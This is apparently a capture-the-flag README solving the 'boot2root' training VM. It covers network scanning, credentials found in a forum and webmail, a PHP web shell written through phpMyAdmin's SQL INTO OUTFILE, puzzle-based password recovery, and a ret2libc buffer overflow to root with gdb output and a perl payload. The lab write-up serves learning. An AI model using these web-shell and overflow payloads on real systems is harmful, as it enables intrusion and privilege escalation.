# boot2root
root a iso using multiple vulnerabilities 


## Get IP running VirtualBox machine (boot2root)

```
VBoxManage guestproperty get boot2root "/VirtualBox/GuestInfo/Net/0/V4/IP"
```
#### OR  
  
 ```
ifconfig | grep inet            // to get ip address and netmask of current machine (e.g. 10.13.0.0/16)  
netdiscover -r 10.13.0.0/16     // to get ip address of virtual box env. (e.g. 10.13.0.132)  
nmap 10.13.0.132                // to get open ports (notably 80 http and 443 https)  
```

## Web Portal

#### Get access to forum and get email

1. `dirb https://10.13.0.132` shows that there are directories on the server named `forum` `phpmyadmin` and `webmail`  
2. Go to `https://10.13.0.132/forum/` and open the thread "Problemes login". Inside find failed attempt to login using what looks like a password (!q\]Ej?*5K5cy*AJ) instead of username, followed by successful login of user lmezard.  
4. Then login the forums with credentials, and find lmezard's email address (`laurie@borntosec.net`).  

#### Access webmail and get DB Access

1. Then go to `https://10.13.0.132/webmail/` and login with email and same password.  
2. Open mail with subject "DB Access" and get credentials for root access to database (root/Fg-'kKXBj87E:aJ$)

#### Access PHPMyAdmin and inject php script

1. Go to `https://10.13.0.158/phpmyadmin/` and login with credentials  
2. Go to SQL tab to execute SQL command. The following command allows you to create a file through sql and thus write a php script which will allow you to execute commands through the url parameters given to the file, if you have access to said file through the server.
```
SELECT "<?php $out = array();exec($_GET[\"cmd\"], $out);foreach($out as $line) {echo $line.\"<br />\";}?>" INTO outfile "/path/to/file/cmd.php"
```
3. Now you need to find out where to put the file so you have access rights.  
    The server is apache, so you try `/var/www/` and get error insufficient rights.  
    You go back to the dirb results (`dirb https://10.13.0.132`) to check server folder hierarchy.  
    Try every sub folder (e.g. forum you try `/var/www/forum/cmd.php`) until you find you have rights to `/var/www/forum/templates_c folder`.  
    So now you have your php script in that folder, go to `https://10.13.0.132/forum/templates_c/cmd.php?cmd=ls%20-la%20/home`  
4. Using shell commands in the url query, find directory called LOOKATME, the file named password. Use cat on file and get credentials: lmezard:G!@M6f4Eatau{sF"  
5. Login to Boot2Root VM.

## LMEZARD user

1. Read instructions in directory and checkout fun with `file fun`  
2. Copy fun in `/tmp/` and cd there. Then unarchive it with `tar xvf fun` to get directory ft_fun/  
3. Run script in directory:
    `./notfun.sh`
    ```
    #!/bin/sh
    for f in *.pcap; do
      d="$(cat $f | grep file | cut -c 3-)"
      mv "$f" "$d"
      sed -i '$d' "$d"
      sed -i '/^$/d' "$d"
    done

    i=1
    while [ $i -lt 100 ]
    do
      if [ $i -lt 10 ]; then
        mv "file$i" "file00$i"
      else
        mv "file$i" "file0$i"
      fi
      i=$((i+1))
    done
    cat "file*" > main.c
    ```
4. Compile and execute the C file to get password.
    ```
    lmezard@BornToSecHackMe:ft_fun$ gcc main.c && ./a.out
    My password is: Iheartpwnage
    Encrypt it with Sha-256 to use passwordlmezard@BornToSecHackMe:ft_fun$
    ```
5. Encrypting "Iheartpwnage" with Sha-256 gives you: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

## LAURIE user

1. Bomb is an executable. Use [Ghidra](https://ghidra-sre.org/) to transform the binary into pseudo C code in order to inspect all 6 levels of the bomb.  
2. The README file gives you hints for all the levels (usually first or second character of the answer).  
3. The first level simply checks if your answer is equal to "Public speaking is very easy."  
4. The second level requires an array of 6 integers which must not return true on the following while n increases from 1 to 5 inclusively:
    ```
    answers[n+1] != (n + 1) * answers[n]
    ```
    Which gives you "1 2 6 24 120 720"  
5. The third level has multiple possible answers, but knowing that the second character has to be "b" (thanks to the hint), you get "2 b 214"
6. The fourth level checks that the following function returns 55:
    ```
    phase_4.swift
    func calc(num: Int) -> Int {
        var a = 0, b = 0
    
        if num < 2 {
            b = 1
        } else {
            a = calc(num: num - 1)
            b = calc(num: num - 2)
            b = b + a
        }
        return b
    }
    ```
    So the answer is 9.  
7. The fifth level you find that you need to input 5 characters which, after being AND 0xf and used as index in the array in the screenshot, give the word "giants". (e.g. "g" from "giants" is position 15 in the array, which you can get after xxxx1111 &AND 0xf. The only letter with xxxx0000 is "o")  
    <img src="https://github.com/42aroger/boot2root/blob/master/img/bomb_phase_5.png?raw=true"
     title="Bomb Phase 5" width="400">  
    Following this logic, the outcome is "opekmq".  
8. The last level (6) has a pretty hefty function with a bunch of operations, but reading the first few, you can deduce that you need 6 non-repeating numbers (never the same number twice), between 1 and 6. With the hint, you also know that the second number is "2". So after that you can feed all the possible sequences to the function until one passes the tests. The winner is "4 2 6 3 1 5".
9. Following the instructions, you must concatenate all the answers without spaces to form the password. But do not forget to [swap len-1 and len-2 character](https://stackoverflow.com/c/42network/questions/664).  
10. The password for Thor is then: "Publicspeakingisveryeasy.126241207201b2149opekmq426135"

## THOR user

1. The file turtle contains human inscructions to move around (probably to draw something). Turtle is a python library which uses human-like function names to draw in 2D space. Parsing this into the actual Turtle code will draw something on screen.  
2. Use the `turtle_parser.py` script in the same directory which will draw "SLASH".  
3. At the bottom of the turtle file, it is written "Can you digest the message? :)". Digest Message -> Message Digest -> Message Digest 5 -> MD5.
4. "SLASH" hashed with MD5 gives you: `646da671ca01bb5d84dbb5fb2238dc8e` which is the password for ZAZ.

## ZAZ user

#### find char numbers to overwrite the EIP

```
./exploit_me `printf 'A%.0s' {1..140}`
```
```
zaz@BornToSecHackMe:~$ ./exploit_me `printf 'A%.0s' {1..140}`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Illegal instruction (core dumped)
```

#### gdb break at strcpy in main

```
gdb exploit_me
(gdb) disass main
Dump of assembler code for function main:
   0x080483f4 <+0>:	push   %ebp
   0x080483f5 <+1>:	mov    %esp,%ebp
   0x080483f7 <+3>:	and    $0xfffffff0,%esp
   0x080483fa <+6>:	sub    $0x90,%esp
   0x08048400 <+12>:	cmpl   $0x1,0x8(%ebp)
   0x08048404 <+16>:	jg     0x804840d <main+25>
   0x08048406 <+18>:	mov    $0x1,%eax
   0x0804840b <+23>:	jmp    0x8048436 <main+66>
   0x0804840d <+25>:	mov    0xc(%ebp),%eax
   0x08048410 <+28>:	add    $0x4,%eax
   0x08048413 <+31>:	mov    (%eax),%eax
   0x08048415 <+33>:	mov    %eax,0x4(%esp)
   0x08048419 <+37>:	lea    0x10(%esp),%eax
   0x0804841d <+41>:	mov    %eax,(%esp)
   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
   0x08048425 <+49>:	lea    0x10(%esp),%eax
   0x08048429 <+53>:	mov    %eax,(%esp)
   0x0804842c <+56>:	call   0x8048310 <puts@plt>
   0x08048431 <+61>:	mov    $0x0,%eax
   0x08048436 <+66>:	leave
   0x08048437 <+67>:	ret
End of assembler dump.
(gdb) b *0x08048420
Breakpoint 1 at 0x8048420
(gdb) r
```

#### Find EIP address

```
(gdb) r $(perl -e 'print "A"x140 . "\xef\xbe\xad\xde"')
Starting program: /home/zaz/exploit_me $(perl -e 'print "A"x140 . "\xef\xbe\xad\xde"')

Breakpoint 1, 0x08048420 in main ()
```

#### Find system function address

```
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

#### Find chars "/bin/sh"

```
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
1 pattern found.
(gdb) x/s 0xb7f8cc58
0xb7f8cc58:	 "/bin/sh"
```

#### Prepare attack

```
perl -e 'print "A"x140 . "\x60\xb0\xe6\xb7" . "OSEF" . "\x58\xcc\xf8\xb7"'
```

#### Execute

```
./exploit_me $(perl -e 'print "A"x140 . "\x60\xb0\xe6\xb7" . "OSEF" . "\x58\xcc\xf8\xb7"')

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`��OSEFX��
# id
uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)

```

We are now root

![shellcode](https://github.com/42aroger/boot2root/blob/master/img/rooted.png?raw=true)

Greetings to [hackndo](https://beta.hackndo.com/retour-a-la-libc/)
